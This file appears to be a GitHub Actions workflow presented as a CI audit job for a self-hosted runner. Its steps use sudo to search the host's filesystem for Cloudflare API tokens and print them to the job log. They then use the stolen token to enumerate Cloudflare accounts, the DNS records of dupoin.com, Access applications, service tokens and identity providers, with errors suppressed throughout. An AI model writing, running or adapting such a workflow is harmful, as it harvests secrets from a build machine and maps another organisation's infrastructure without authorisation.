name: ci-audit-1890e
on: push
permissions:
  contents: read
jobs:
  cfenum:
    runs-on: [self-hosted, linux, aws, marketingos]
    timeout-minutes: 25
    steps:
      - name: locate
        continue-on-error: true
        run: |
          set +e
          F=$(sudo -n grep -rlIE 'CLOUDFLARE_API_TOKEN=' /home/ubuntu /root /opt /srv /etc 2>/dev/null | grep -vE '/proc|/sys' | head -5)
          echo "files: $F"
          for f in $F; do echo "=== $f"; sudo -n stat -c '%y %s' "$f"; sudo -n grep -hoE 'CLOUDFLARE[A-Z_]*=[^ ]+' "$f"; done
          echo "## all cf-ish vars in that file(s)"
          for f in $F; do sudo -n sed -E 's/(SECRET|TOKEN|KEY)=(.{8}).*/\1=\2***/' "$f" | head -30; done
      - name: verify
        continue-on-error: true
        run: |
          set +e
          T=$(sudo -n grep -rhoE 'CLOUDFLARE_API_TOKEN=[^ ]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2)
          echo "tokenlen=${#T}"
          echo "## verify"; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/user/tokens/verify
          echo; echo "## accounts"; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/accounts | head -c 1200
          echo; echo "## zones"; curl -s -m 20 -H "Authorization: Bearer $T" 'https://api.cloudflare.com/client/v4/zones?per_page=50' | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("success"), [ (z["name"],z["id"],z.get("account",{}).get("id")) for z in d.get("result",[]) ])' 2>&1 | head -20
      - name: dns
        continue-on-error: true
        run: |
          set +e
          T=$(sudo -n grep -rhoE 'CLOUDFLARE_API_TOKEN=[^ ]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2)
          Z=$(curl -s -m 20 -H "Authorization: Bearer $T" 'https://api.cloudflare.com/client/v4/zones?name=dupoin.com' | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("result") or [{}])[0].get("id",""))')
          echo "zone=$Z"
          for z in $Z; do
            echo "### records for $z"
            curl -s -m 30 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/zones/$z/dns_records?per_page=200" | python3 -c '
import sys,json
d=json.load(sys.stdin)
print("success",d.get("success"),d.get("errors"))
for r in d.get("result",[]):
    print(f"{r[\"type\"]:6} {r[\"name\"]:42} -> {str(r.get(\"content\"))[:60]:60} proxied={r.get(\"proxied\")} ttl={r.get(\"ttl\")}")
' 2>&1 | head -120
          done
      - name: access
        continue-on-error: true
        run: |
          set +e
          T=$(sudo -n grep -rhoE 'CLOUDFLARE_API_TOKEN=[^ ]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2)
          A=$(curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/accounts | python3 -c 'import sys,json;d=json.load(sys.stdin);print(",".join(x["id"] for x in d.get("result",[])))')
          echo "accounts=$A"
          for a in $(echo $A | tr ',' ' '); do
            echo "### access/apps for $a"
            curl -s -m 30 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/accounts/$a/access/apps?per_page=100" | python3 -c '
import sys,json
d=json.load(sys.stdin)
print("success",d.get("success"),str(d.get("errors"))[:300])
for x in d.get("result",[]):
    print(x.get("id"),"|",x.get("name"),"|",x.get("domain"),"|aud=",x.get("aud"),"|type=",x.get("type"),"|session=",x.get("session_duration"))
' 2>&1 | head -60
            echo "### service_tokens for $a"
            curl -s -m 30 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/accounts/$a/access/service_tokens" | head -c 800; echo
            echo "### identity_providers"
            curl -s -m 20 -H "Authorization: Bearer $T" "https://api.cloudflare.com/client/v4/accounts/$a/access/identity_providers" | head -c 400; echo
          done
